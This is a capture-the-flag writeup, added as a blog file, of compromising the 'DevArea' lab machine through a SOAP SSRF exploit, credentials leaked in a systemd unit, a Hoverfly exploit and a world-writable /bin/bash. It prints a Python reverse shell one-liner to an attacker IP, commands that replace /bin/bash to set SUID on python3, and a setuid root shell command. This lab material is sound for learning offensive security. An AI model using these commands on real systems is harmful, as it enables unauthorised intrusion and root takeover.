@@ -1,0 +1,160 @@
+import { Code, Block, Marker, Bild } from "../components.tsx";
+
+**Disclaimer**: The steps for this writeup are based on my notes and memory, so they might not be 100% accurate. Additionally, I have changed the flags for this writeup, so they won't match the ones on the machine.
+
+<br />
+
+Starting off with a <Code content="nmap" /> scan:
+
+<Block
+  language="Bash"
+  content={
+    "21\t\t- FTP (vsftpd 3.0.5)\n22\t\t- SSH\n80\t\t- HTTP\n8080\t- HTTP (Jetty 9.4.27)\n8500\t- HTTP Proxy\n8888\t- Hoverfly Dashboard"
+  }
+/>
+
+Port <Code content="80" /> serves a static webpage with nothing interesting. Port <Code content="8500" /> identifies itself as a proxy but returns <Code content="407 Proxy Authentication Required" />. FTP runs <Code content="vsftpd 3.0.5" />, which is only vulnerable to DoS, a dead end. Port <Code content="8888" /> runs a <Code content="Hoverfly" /> dashboard.
+
+<Bild
+  src="https://s8lcpnzirhyz4bbt.public.blob.vercel-storage.com/Blogs/devarea-hoverfly.png"
+  alt="Hoverfly login page"
+  width={1390}
+  height={929}
+/>
+
+I ran the usual enumeration: directory and VHost fuzzing on ports <Code content="80" /> and <Code content="8888" />, anonymous FTP login attempts, and weak credential checks against both FTP and the Hoverfly dashboard. Nothing immediately useful came back.
+
+<br />
+
+Fuzzing port <Code content="8080" /> uncovers an interesting endpoint:
+
+<Block language="Bash" content={"http://devarea.htb:8080/employeeservice"} />
+
+Accessing it returns a SOAP fault response, indicating a SOAP web service. Fetching the WSDL reveals a single method:
+
+<Block
+  language="Bash"
+  content={"curl http://devarea.htb:8080/employeeservice?wsdl"}
+/>
+
+<Block
+  language="Python"
+  content={"submitReport(arg0: ns0:report) -> return: xsd:string"}
+/>
+
+The response also shows: The <Code content="report" /> type consists of a boolean <Code content="confidential" /> and three strings: <Code content="content" />, <Code content="department" />, and <Code content="employeeName" />. Interacting with the service via <Code content="zeep" /> confirms it processes and reflects input back.
+
+<br />
+
+Since the service is SOAP-based, I tested for XXE injection. DTD-based payloads are blocked, but <Marker content="CVE-2022-46364" link="https://nvd.nist.gov/vuln/detail/CVE-2022-46364" />, an Apache CXF SSRF vulnerability exploitable via unvalidated <Code content="XOP:Include" /> href attributes in MTOM-encoded requests, works perfectly.
+
+<br />
+
+For this I used the public <Marker content="CVE-2022-46364" link="https://github.com/kasem545/CVE-2022-46364-Poc" />, which allows reading arbitrary files on the server. <Code content="/etc/passwd" /> reveals an interesting user: <Code content="dev_ryan" />.
+
+<br />
+
+Further file reads via the exploit don't turn up SSH keys or credentials in the usual locations. So I enumerated further through <Code content="/opt" />, <Code content="/var" /> and <Code content="/etc" />.
+
+<br />
+
+When I enumerated the Hoverfly website, I directly checked for default credentials. The documentation mentions, that the service has to be started with options for basic authentication. So I checked how Hoverfly is started on the machine.
+
+<br />
+
+Crontab didn't show anything, neither did <Code content="/etc/cron.d" /> oder the systemd services for the user. However, listing <Code content="/etc/systemd/system/" /> reveals <Code content="hoverfly.service" />:
+
+<Block
+  language="Bash"
+  content={
+    "ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ57MyyXiU -listen-on-host 0.0.0.0"
+  }
+/>
+
+Credentials in plain text inside the service definition. These work against the Hoverfly API. Hoverfly's token endpoint returns a JWT:
+
+<Block
+  language="Bash"
+  content={
+    'curl -X POST http://devarea.htb:8888/api/token-auth \\n\t-H \'Content-Type: application/json\' \\n\t-d \'{"username": "admin", "password": "O7IJ57MyyXiU"}\''
+  }
+/>
+
+Armed with the token, <Marker content="CVE-2025-54123" link="https://github.com/0xzap/CVE-2025-54123" /> is exploitable, establishing a reverse shell as <Code content="dev_ryan" />. SSH persistence is set up by adding a public key to <Code content="~/.ssh/authorized_keys" />. The user flag is found in the home directory.
+
+<br />
+
+Moving on to privilege escalation. Running <Code content="sudo -l" /> shows:
+
+<Block
+  language="Bash"
+  content={
+    "(root) NOPASSWD: /opt/syswatch/syswatch.sh\n(root) !/opt/syswatch/syswatch.sh web-stop\n(root) !/opt/syswatch/syswatch.sh web-restart"
+  }
+/>
+
+Reviewing <Code content="syswatch.sh" /> reveals the script calls <Code content="/bin/bash" /> internally and sources a config file at startup. More interestingly:
+
+<Block
+  language="Bash"
+  content={
+    "ls -la /bin/bash\n-rwxrwxrwx 1 root root 1446024 Mar 31 2024 /bin/bash"
+  }
+/>
+
+<Code content="/bin/bash" /> is world-writable. The plan is to overwrite it with
+a payload that sets the SUID bit on <Code content="python3" />, then trigger it
+via <Code content="sudo syswatch.sh" />. However, directly overwriting
+<Code content="/bin/bash" /> fails with <Code content="Text file busy" /> since
+bash is the active shell.
+
+<br />
+
+The fix is to drop the current bash session entirely. A Python reverse shell is used to establish a <Code content="/bin/sh" /> session instead:
+
+<Block
+  language="Python"
+  content={
+    'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("10.10.14.23",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\''
+  }
+/>
+
+From this <Code content="sh" /> session, <Code content="/bin/bash" /> is no longer busy and can be overwritten:
+
+<Block
+  language="Bash"
+  content={
+    "echo '#!/bin/bash' > /tmp/pwn.sh\necho 'chmod u+s /usr/bin/python3' > /tmp/pwn.sh\nchmod +x /tmp/pwn.sh\ncp /tmp/pwn.sh /bin/bash\nsudo /opt/syswatch/syswatch.sh web"
+  }
+/>
+
+<Code content="syswatch.sh" /> runs as root and invokes the now-replaced
+<Code content="/bin/bash" />, which sets the SUID bit on
+<Code content="python3" />. A root shell follows:
+
+<Block
+  language="Python"
+  content={"python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'"}
+/>
+
+Root flag retrieved from <Code content="/root/root.txt" />.
+
+<br />
+
+Here are the main takeaways from this machine:
+
+<br />
+
+**SOAP services are worth the effort**: They look intimidating at first but the WSDL hands you the full interface. From now on, I am gonna fetch <Code content="?wsdl" /> immediately.
+
+<br />
+
+**Systemd service files are goldmines**: Credentials passed via command line flags are pretty common. I should always check <Code content="/etc/systemd/system/" /> when doing file reads.
+
+<br />
+
+**Text file busy means drop the process**: I cannot overwrite a binary that is currently in use. Doesn't matter if shell or other application. Pivoting to something different and killing the original is the way to go. In this case, dropping from bash to sh did the trick.
+
+<br />
+
+**World-writable binaries are rare but devastating**: Always run <Code content="ls -la" /> early in enumeration. A world-writable system binary is an instant privesc.
